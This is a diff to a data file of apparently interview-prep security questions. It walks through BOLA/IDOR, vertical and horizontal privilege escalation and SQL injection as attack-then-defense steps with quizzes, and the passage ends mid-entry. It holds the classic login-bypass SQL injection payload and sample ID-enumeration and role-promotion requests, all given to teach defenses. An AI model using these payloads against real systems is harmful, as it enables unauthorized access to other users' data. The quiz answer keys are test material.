-            "definition": "Broken Object-Level Authorization: Accessing another user record by tampering IDs."
+            "term": "BOLA (OWASP API #1)",
+            "definition": "Broken Object Level Authorization: Failure to verify whether the authenticated user owns or has rights to the requested object ID."
+          },
+          {
+            "term": "IDOR",
+            "definition": "Insecure Direct Object Reference: Exposing raw database primary keys directly in URLs without server-side permission checks."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "The attacker authenticates legitimately to receive their own invoice (ID 1001). Observing that the application uses sequential auto-incrementing integer IDs, the attacker writes an automated script issuing GET /api/v1/invoices/1002, 1003, 1004. This probes whether the API checks user ownership on the queried object.",
+        "whyItMatters": "BOLA is consistently ranked as the #1 most pervasive and catastrophic vulnerability in the OWASP API Security Top 10.",
+        "securityVerdict": "Attacker attempts horizontal privilege escalation via direct object reference manipulation.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 REST API",
+          "method": "GET /api/v1/invoices/1004",
           "headers": [
-            "Host: api.broken.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Authorization: Bearer eyJhbGciOi... (Valid token for User 42)",
+            "Host: api.billing.io"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Vulnerable API Endpoint\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Vulnerable API Endpoint.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "Target: Invoice #1004 (Belongs to User 99, NOT User 42).",
+          "securityAction": "API gateway confirms User 42 token is valid, but routes request to repository layer.",
+          "statusBadge": "BOLA ATTEMPT"
         }
       },
       {
         "id": 2,
-        "label": "Flawed Query Execution",
-        "from": "flawed_api",
-        "to": "flawed_api",
-        "packet": "SELECT * FROM invoices WHERE id = 1002 (Missing User Check!)",
-        "caption": "Step 2: Vulnerability: The API checks that the user has a valid JWT, but fetches the object directly by ID without verifying record ownership.",
+        "label": "Vulnerable Endpoint Execution",
+        "from": "gateway",
+        "to": "database",
+        "packet": "SELECT * FROM invoices WHERE id = 1004 (Missing user_id check!)",
+        "caption": "Step 2: Flaw: Backend queries directly by object ID without checking if current_user.id owns the record, leaking data.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Flawed Query Execution",
-        "whatIsHappeningText": "Step 2: Vulnerability: The API checks that the user has a valid JWT, but fetches the object directly by ID without verifying record ownership.",
+        "whatIsHappeningTitle": "Step 2: Vulnerable Endpoint Execution",
+        "whatIsHappeningText": "Step 2: Flaw: Backend queries directly by object ID without checking if current_user.id owns the record, leaking data.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Missing Ownership Validation",
+            "definition": "Executing database lookups solely on client-supplied entity IDs without binding to authenticated session user ID."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Horizontal Data Leak",
+            "definition": "Unauthorized exposure of peer user records across identical privilege tiers."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "In the vulnerable controller code (e.g. Invoice.findById(req.params.id)), the developer relies solely on the path parameter. Because authentication succeeded at the gateway, the developer mistakenly assumes authorization is complete, returning Customer 99's private medical bills and credit card records to User 42.",
+        "whyItMatters": "Leads to mass data harvesting, compliance violations (GDPR/HIPAA), and severe brand damage.",
+        "securityVerdict": "Critical vulnerability: missing object-level authorization allows peer-to-peer data exfiltration.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "PostgreSQL Database Layer",
+          "method": "SELECT query without ownership constraint",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Query: SELECT * FROM invoices WHERE id = 1004",
+            "Tenant-Context: Omitted"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Vulnerable API Endpoint validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Result: { id: 1004, customer: 'Victim Corp', amount: $84,000, ssn: '•••-••-1290' }",
+          "securityAction": "Database returns record because query did not filter by session owner.",
+          "statusBadge": "DATA EXFILTRATED"
         }
       },
       {
         "id": 3,
-        "label": "Tenant Scoping Defense",
-        "from": "flawed_api",
-        "to": "tenant_filter",
-        "packet": "SELECT * FROM invoices WHERE id = 1002 AND user_id = :current_user",
-        "caption": "Step 3: Defense: The database query enforces tenancy by scoping both by the target resource ID AND the authenticated caller's session user ID.",
+        "label": "Repository-Level Scoped Query Defense",
+        "from": "gateway",
+        "to": "database",
+        "packet": "SELECT * FROM invoices WHERE id = 1004 AND user_id = 42 (Scoped Binding)",
+        "caption": "Step 3: Definitive fix: Scope database queries to the authenticated tenant: WHERE id = :id AND user_id = :currentUser.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Tenant Scoping Defense",
-        "whatIsHappeningText": "Step 3: Defense: The database query enforces tenancy by scoping both by the target resource ID AND the authenticated caller's session user ID.",
+        "whatIsHappeningTitle": "Step 3: Scoped Query Defense",
+        "whatIsHappeningText": "Step 3: Definitive fix: Scope database queries to the authenticated tenant: WHERE id = :id AND user_id = :currentUser.",
         "terms": [
           {
-            "term": "Tenant Scoping",
-            "definition": "Filtering queries by both object ID and authenticated session tenant/user ID."
+            "term": "Scoped Query Pattern",
+            "definition": "Enforcing ownership at the database query level by always appending session user/tenant IDs to WHERE clauses."
+          },
+          {
+            "term": "Repository-Level Authorization",
+            "definition": "Architecting data access layers so single-object lookups require both entity ID and tenant context."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "The secure implementation never queries by object ID alone. It binds the authenticated user ID extracted from the verified session: 'SELECT * FROM invoices WHERE id = ? AND user_id = ?'. When User 42 requests Invoice 1004 (owned by User 99), the query returns zero rows. The application returns HTTP 404 Not Found, preventing ID enumeration.",
+        "whyItMatters": "Eliminates human developer oversight by baking authorization directly into data access queries.",
+        "securityVerdict": "Data layer guarantees users can only retrieve objects they own.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "PostgreSQL Scoped Query",
+          "method": "SELECT * FROM invoices WHERE id = 1004 AND user_id = 42",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Session-User: usr_42",
+            "Target-ID: 1004"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Tenant-Scoped Query\" }",
-          "securityAction": "Backend service Tenant-Scoped Query enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Query returned 0 rows. User 42 does not own invoice 1004.",
+          "securityAction": "Repository detects non-existent or unowned record; returns 404 Not Found to caller.",
+          "statusBadge": "BOLA PREVENTED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "tenant_filter",
-        "to": "secure_db",
-        "packet": "0 rows returned -> 404 Not Found",
-        "caption": "Step 4: Interview line: \"BOLA / IDOR is the #1 API security vulnerability — eliminate it by validating object-level ownership on every request and scoping database queries to the authenticated tenant context.\"",
+        "from": "server",
+        "to": "attacker",
+        "packet": "HTTP 404 Not Found (UUID v4 + Scoped DB Ownership Checks)",
+        "caption": "Step 4: Interview line: \"To solve BOLA (OWASP API #1), never query by ID alone: always scope queries to the authenticated tenant (WHERE id = ? AND user_id = ?), and replace sequential IDs with unguessable UUID v4s.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"BOLA / IDOR is the #1 API security vulnerability — eliminate it by validating object-level ownership on every request and scoping database queries to the authenticated tenant context.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"To solve BOLA (OWASP API #1), never query by ID alone: always scope queries to the authenticated tenant (WHERE id = ? AND user_id = ?), and replace sequential IDs with unguessable UUID v4s.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "UUID v4",
+            "definition": "128-bit cryptographically random identifier providing 122 bits of entropy, making brute-force ID guessing impossible."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "404 Masking Strategy",
+            "definition": "Returning 404 Not Found instead of 403 Forbidden on unowned object IDs to avoid confirming resource existence."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior engineers highlight two complementary defenses: 1) Cryptographic unguessability using UUID v4 (e.g. /invoices/9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d), preventing sequential scanning; and 2) Strict repository-level ownership scoping. If an unowned ID is queried, return 404 rather than 403 to prevent attackers from confirming whether the ID exists.",
+        "whyItMatters": "Definitively neutralizes the #1 most common API vulnerability in modern web applications.",
+        "securityVerdict": "Defense-in-depth: unguessable identifiers combined with mandatory data-layer tenancy checks.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "RFC 9110 REST Response",
+          "method": "HTTP/1.1 404 Not Found",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Content-Type: application/problem+json",
+            "X-Content-Type-Options: nosniff"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always enforce tenancy in the data access layer: SELECT * FROM documen...\" }",
-          "securityAction": "Final defensive control verified: Database Engine secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "{\"error\": \"not_found\", \"message\": \"The requested invoice does not exist.\"}",
+          "securityAction": "API masks access denial as 404; stops attacker from confirming valid IDs in database.",
+          "statusBadge": "404 MASKED"
         }
       }
     ],
@@ -2835,15 +2865,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "Always enforce tenancy in the data access layer: SELECT * FROM documents WHERE id = :id AND account_id = :session_account_id. Returning 404 instead of 403 prevents attackers from learning whether an object exists.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What is Broken Object-Level Authorization (BOLA / IDOR) in APIs and how is it prevented?\"?",
+      "question": "What is the most effective and resilient defense against Broken Object-Level Authorization (BOLA / IDOR, OWASP API #1)?",
       "options": [
-        "0 rows returned -> 404 Not Found",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Enforcing object-level ownership at the database query level (e.g. WHERE id = :id AND user_id = :currentUser) and using UUID v4 identifiers, returning 404 if no record matches",
+        "Hiding object IDs inside the browser's cookies so they never appear in URLs",
+        "Adding client-side JavaScript validation that hides edit buttons if the user is not an admin",
+        "Relying solely on JWT signature verification at the API gateway without checking database record ownership"
       ],
       "correctIndex": 0,
-      "explanation": "Always enforce tenancy in the data access layer: SELECT * FROM documents WHERE id = :id AND account_id = :session_account_id. Returning 404 instead of 403 prevents attackers from learning whether an object exists."
+      "explanation": "BOLA occurs when applications verify that a user is logged in, but fail to verify whether they own the specific object requested. The definitive defense is repository-level scoping (WHERE id = :id AND tenant_id = :tenant) combined with UUID v4 to prevent sequential enumeration."
     }
   },
   {
@@ -2882,143 +2912,142 @@ export const questionsData: QuestionData[] = [
       {
         "id": 1,
         "label": "Vertical Escalation Attempt",
-        "from": "standard_user",
-        "to": "vertical_target",
-        "packet": "POST /admin/settings (Standard User calls Admin API)",
-        "caption": "Step 1: Vertical Escalation: A low-privilege user attempts to access high-privilege administrative functions or endpoints.",
+        "from": "attacker",
+        "to": "gateway",
+        "packet": "POST /api/v1/admin/users/promote (Standard user attempts role elevation)",
+        "caption": "Step 1: Vertical Privilege Escalation: A low-privileged user attempts to access administrative functions across privilege tiers.",
         "status": "attack",
         "whatIsHappeningTitle": "Step 1: Vertical Escalation Attempt",
-        "whatIsHappeningText": "Step 1: Vertical Escalation: A low-privilege user attempts to access high-privilege administrative functions or endpoints.",
+        "whatIsHappeningText": "Step 1: Vertical Privilege Escalation: A low-privileged user attempts to access administrative functions across privilege tiers.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Vertical Privilege Escalation",
+            "definition": "An attacker with standard privileges gains access to administrative or elevated functions (e.g. User -> Admin)."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "BFLA (Broken Function Level Authorization)",
+            "definition": "OWASP API #5: Failure to enforce role permissions on administrative and sensitive API routes."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "In a vertical escalation attack, an attacker logged in as a basic user (role: 'member') attempts to execute administrative endpoints (e.g. POST /admin/promote or parameter tampering role='admin'). If the API only checks whether the user is logged in without asserting 'admin' permission on the route, privilege elevation succeeds.",
+        "whyItMatters": "Grants untrusted users full administrative control over application configurations, user accounts, and infrastructure.",
+        "securityVerdict": "Vertical boundary breach attempt targeting elevated administrative privileges.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 REST Endpoint",
+          "method": "POST /admin/api/v1/users/promote",
           "headers": [
-            "Host: api.vertical.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Authorization: Bearer eyJhbGciOi... (Role: member)",
+            "Content-Type: application/json"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Admin Route (Vertical)\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Admin Route (Vertical).",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "{\"targetUserId\": \"usr_491\", \"newRole\": \"superadmin\"}",
+          "securityAction": "Gateway evaluates caller role against required administrative permissions.",
+          "statusBadge": "VERTICAL PROBE"
         }
       },
       {
         "id": 2,
-        "label": "Horizontal Escalation Attempt",
-        "from": "standard_user",
-        "to": "horizontal_target",
-        "packet": "GET /users/victim_99/tax_info (Accessing Peer User Data)",
-        "caption": "Step 2: Horizontal Escalation: A user accesses data or resources belonging to another user with the same privilege level.",
-        "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Horizontal Escalation Attempt",
-        "whatIsHappeningText": "Step 2: Horizontal Escalation: A user accesses data or resources belonging to another user with the same privilege level.",
+        "label": "Vertical Defense (Role & Capability Guards)",
+        "from": "gateway",
+        "to": "server",
+        "packet": "Role Guard: @PreAuthorize(\"hasRole('ADMIN')\") -> 403 Forbidden",
+        "caption": "Step 2: Defend vertical escalation with declarative route middleware and capability guards that verify required roles.",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 2: Vertical Defense",
+        "whatIsHappeningText": "Step 2: Defend vertical escalation with declarative route middleware and capability guards that verify required roles.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Declarative Role Guard",
+            "definition": "Middleware or decorators (e.g. @RequireRole('ADMIN')) enforcing permission checks before controller invocation."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Principle of Least Privilege",
+            "definition": "Granting subjects only the minimum permissions necessary to complete their assigned business duties."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "Vertical escalation is prevented using declarative function-level authorization guards. Middleware or framework decorators inspect the caller's verified claims or session roles before routing to the controller. If role != 'admin', execution halts immediately with HTTP 403 Forbidden.",
+        "whyItMatters": "Ensures administrative controllers cannot be executed by standard members regardless of URL knowledge.",
+        "securityVerdict": "Vertical privilege boundary maintained; access denied to unprivileged role.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "Role Enforcement Middleware",
+          "method": "HTTP/1.1 403 Forbidden",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Content-Type: application/problem+json",
+            "X-Required-Role: ADMIN"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Admin Route (Vertical) validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "{\"error\": \"forbidden\", \"detail\": \"Endpoint requires ADMIN role. Current role: member\"}",
+          "securityAction": "Middleware intercepts request; halts execution prior to administrative controller.",
+          "statusBadge": "403 BLOCKED"
         }
       },
       {
         "id": 3,
-        "label": "RBAC Stops Vertical Attacks",
-        "from": "vertical_target",
-        "to": "rbac_abac_guard",
-        "packet": "Check Role: caller.role == \"admin\" -> 403 Forbidden",
-        "caption": "Step 3: Role-Based Access Control (RBAC) middleware enforces hierarchical role boundaries to stop vertical elevation.",
-        "status": "defense",
-        "whatIsHappeningTitle": "Step 3: RBAC Stops Vertical Attacks",
-        "whatIsHappeningText": "Step 3: Role-Based Access Control (RBAC) middleware enforces hierarchical role boundaries to stop vertical elevation.",
+        "label": "Horizontal Escalation Attempt",
+        "from": "attacker",
+        "to": "gateway",
+        "packet": "GET /api/v1/patients/9821/records (Patient A attempts viewing Patient B's chart)",
+        "caption": "Step 3: Horizontal Privilege Escalation (BOLA): A user accesses data belonging to another user within the SAME privilege tier.",
+        "status": "attack",
+        "whatIsHappeningTitle": "Step 3: Horizontal Escalation Attempt",
+        "whatIsHappeningText": "Step 3: Horizontal Privilege Escalation (BOLA): A user accesses data belonging to another user within the SAME privilege tier.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Horizontal Privilege Escalation",
+            "definition": "An attacker accesses resources or actions belonging to another user with the same privilege level (e.g. Patient A -> Patient B)."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Peer Isolation",
+            "definition": "Ensuring users within identical roles remain strictly compartmentalized to their own data."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "In horizontal escalation, the attacker does not seek administrative rights. Patient A (with role 'patient') queries Patient B's medical records by manipulating the patient_id parameter in the URL. Role guards pass because Patient A is indeed a 'patient', but without object-level ownership checks, Patient B's records leak.",
+        "whyItMatters": "Role guards alone cannot prevent horizontal escalation; object-level tenant validation is mandatory.",
+        "securityVerdict": "Horizontal boundary breach attempt targeting peer customer records.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "HTTP/2 Health Portal API",
+          "method": "GET /api/v1/patients/9821/records",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Authorization: Bearer eyJhbGciOi... (Patient ID: 5012)",
+            "Host: health.clinic.io"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Peer Account (Horizontal)\" }",
-          "securityAction": "Backend service Peer Account (Horizontal) enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Requesting medical history for patient 9821 using valid session for patient 5012.",
+          "securityAction": "Role guard passes (Caller is Patient). Routing to data access layer.",
+          "statusBadge": "HORIZONTAL PROBE"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "horizontal_target",
-        "to": "rbac_abac_guard",
-        "packet": "Check Ownership: resource.owner == caller.id",
-        "caption": "Step 4: Interview line: \"Vertical escalation is ascending up the role hierarchy (user to admin), solved by RBAC; horizontal escalation is crossing peer boundaries (user to user), solved by object-level ABAC.\"",
+        "from": "server",
+        "to": "client",
+        "packet": "Complete Defense: Role Guards for Vertical + Object Ownership Scoping for Horizontal",
+        "caption": "Step 4: Interview line: \"Vertical escalation moves up the ladder (User to Admin, defended by RBAC route guards). Horizontal escalation moves across the floor (User A to User B, defended by database object-ownership checks).\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Vertical escalation is ascending up the role hierarchy (user to admin), solved by RBAC; horizontal escalation is crossing peer boundaries (user to user), solved by object-level ABAC.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Vertical escalation moves up the ladder (User to Admin, defended by RBAC route guards). Horizontal escalation moves across the floor (User A to User B, defended by database object-ownership checks).\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Dual-Tier Authorization",
+            "definition": "Layering route-level role checks (vertical) with data-layer ownership checks (horizontal) for complete protection."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Multi-Tenancy Security",
+            "definition": "Architecting software so shared computing environments enforce strict logical data isolation between tenants."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates deliver the definitive interview distinction: Vertical escalation is hierarchical (User -> Admin), defended at the route/middleware layer with Role-Based Access Control (RBAC). Horizontal escalation is lateral (User A -> User B), defended at the data repository layer by verifying tenant ownership on every record query.",
+        "whyItMatters": "Demonstrates mastery over both access control layers necessary to secure enterprise multi-tenant systems.",
+        "securityVerdict": "Comprehensive access control model preventing both hierarchical and lateral attacks.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "Dual-Tier Authorization Engine",
+          "method": "Verification Pipeline",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Vertical-Guard: RBAC Route Evaluator [PASSED]",
+            "Horizontal-Guard: Tenant Scoped Query [ENFORCED]"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"RBAC solves vertical authorization at the routing boundary. ABAC / ReB...\" }",
-          "securityAction": "Final defensive control verified: Unified AuthZ Guard secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "Vertical: Caller has required 'patient' role. Horizontal: WHERE patient_id = 5012 enforced.",
+          "securityAction": "Full dual-tier authorization verified. Peer records isolated; administrative routes protected.",
+          "statusBadge": "DUAL-TIER SECURED"
         }
       }
     ],
@@ -3056,15 +3085,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "RBAC solves vertical authorization at the routing boundary. ABAC / ReBAC solves horizontal authorization at the service and query boundary.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What is the difference between Vertical and Horizontal Privilege Escalation?\"?",
+      "question": "How do you clearly differentiate Vertical Privilege Escalation from Horizontal Privilege Escalation in a software security interview?",
       "options": [
-        "Check Ownership: resource.owner == caller.id",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Vertical escalation moves up the privilege hierarchy (User accessing Admin functions, defended by RBAC route guards); Horizontal escalation moves laterally across users with the same privilege level (User A accessing User B's data, defended by object ownership checks)",
+        "Vertical escalation happens on mobile apps, while Horizontal escalation happens on desktop browsers",
+        "Vertical escalation exploits SQL injection, while Horizontal escalation exploits buffer overflows",
+        "Vertical escalation occurs over HTTPS, while Horizontal escalation occurs over plain HTTP"
       ],
       "correctIndex": 0,
-      "explanation": "RBAC solves vertical authorization at the routing boundary. ABAC / ReBAC solves horizontal authorization at the service and query boundary."
+      "explanation": "Vertical escalation is climbing up privilege tiers (User to Admin), defended by route/function-level role guards. Horizontal escalation is crossing lateral boundaries to access peer records (User A to User B), defended by database object-level ownership checks."
     }
   },
   {
@@ -3102,136 +3131,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Malicious Payload Injected",
-        "from": "attacker_input",
-        "to": "flawed_concat",
-        "packet": "username: admin' OR '1'='1' --",
-        "caption": "Step 1: Attacker inputs SQL syntax into an unsanitized form field to break out of data context and alter query structure.",
+        "label": "Malicious Input Injection Probe",
+        "from": "attacker",
+        "to": "web_server",
+        "packet": "POST /login (Input: admin' OR '1'='1' --)",
+        "caption": "Step 1: Attacker injects SQL metacharacters (' and --) into an unvalidated input field to break out of data context into code context.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Malicious Payload Injected",
-        "whatIsHappeningText": "Step 1: Attacker inputs SQL syntax into an unsanitized form field to break out of data context and alter query structure.",
+        "whatIsHappeningTitle": "Step 1: Malicious Input Injection Probe",
+        "whatIsHappeningText": "Step 1: Attacker injects SQL metacharacters (' and --) into an unvalidated input field to break out of data context into code context.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "SQL Injection (SQLi)",
+            "definition": "An injection vulnerability where untrusted user input is concatenated directly into SQL command strings, altering query structure."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Context Confusion",
+            "definition": "The fundamental security flaw where the SQL parser fails to distinguish between developer command syntax and user data literals."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "The attacker inputs: admin' OR '1'='1' --. The single quote character (') closes the string literal prematurely. The OR condition forces the WHERE clause to evaluate to true for every database record, while the double-dash (--) comments out the remainder of the query (e.g. password verification checks).",
+        "whyItMatters": "Allows complete authentication bypass, arbitrary data extraction, database tampering, and potential operating system takeover.",
+        "securityVerdict": "SQL metacharacter payload submitted to probe interpreter boundary.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 Form Submission",
+          "method": "POST /api/v1/auth/login",
           "headers": [
-            "Host: api.sql.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Content-Type: application/json",
+            "Host: target-shop.com"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"String Concatenation\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to String Concatenation.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "{\"username\": \"admin' OR '1'='1' --\", \"password\": \"random\"}",
+          "securityAction": "Vulnerable web server receives input and prepares to construct SQL command string.",
+          "statusBadge": "SQLI PAYLOAD DISPATCHED"
         }
       },
       {
         "id": 2,
-        "label": "AST Syntax Tree Mutation",
-        "from": "flawed_concat",
-        "to": "flawed_concat",
-        "packet": "SELECT * FROM users WHERE user = 'admin' OR '1'='1'",
-        "caption": "Step 2: String concatenation allows user input to be parsed by the SQL parser as executable commands rather than literal data.",
+        "label": "Dynamic String Concatenation Failure",
+        "from": "web_server",
+        "to": "database",
+        "packet": "Query: SELECT * FROM users WHERE user = 'admin' OR '1'='1' --' AND pass = '...' ",
+        "caption": "Step 2: Flaw: String concatenation merges user input into the SQL command tree, causing the SQL engine to execute attacker logic.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 2: AST Syntax Tree Mutation",
-        "whatIsHappeningText": "Step 2: String concatenation allows user input to be parsed by the SQL parser as executable commands rather than literal data.",
